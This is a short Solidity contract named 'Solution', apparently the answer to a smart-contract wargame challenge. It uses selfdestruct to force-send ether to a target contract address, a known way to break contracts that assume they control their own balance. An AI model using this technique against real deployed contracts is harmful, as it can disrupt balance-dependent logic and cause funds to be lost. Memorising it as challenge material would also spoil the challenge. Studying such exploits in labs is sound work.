pragma solidity ^0.4.21;

contract Solution {
    function force(address instance) external payable {
        require(msg.value > 0, "send something");
        selfdestruct(instance);
    }
}
